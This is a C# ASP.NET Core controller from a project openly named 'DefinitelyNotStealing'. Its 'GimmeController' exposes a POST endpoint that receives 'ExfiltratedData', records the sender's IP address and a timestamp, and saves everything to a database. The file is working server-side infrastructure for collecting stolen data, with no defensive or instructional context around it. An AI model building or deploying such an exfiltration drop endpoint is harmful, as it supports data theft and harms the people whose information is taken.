using System;
using System.Threading.Tasks;
using DefinitelyNotStealing.Data;
using DefinitelyNotStealing.Models.Entities;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace DefinitelyNotStealing.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class GimmeController : ControllerBase
    {
        private readonly AppDataContext _ctx;
        private readonly IHttpContextAccessor _httpContextAccessor;

        public GimmeController(AppDataContext context, IHttpContextAccessor httpContextAccessor)
        {
            _ctx = context;
            _httpContextAccessor = httpContextAccessor;
        }

        [HttpPost]
        public async Task Post([FromBody]ExfiltratedData data)
        {
            data.ID = 0;
            data.Timestamp = DateTime.UtcNow;
            data.ClientIP = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
            await _ctx.AddAsync(data);
            await _ctx.SaveChangesAsync();
        }
    }
}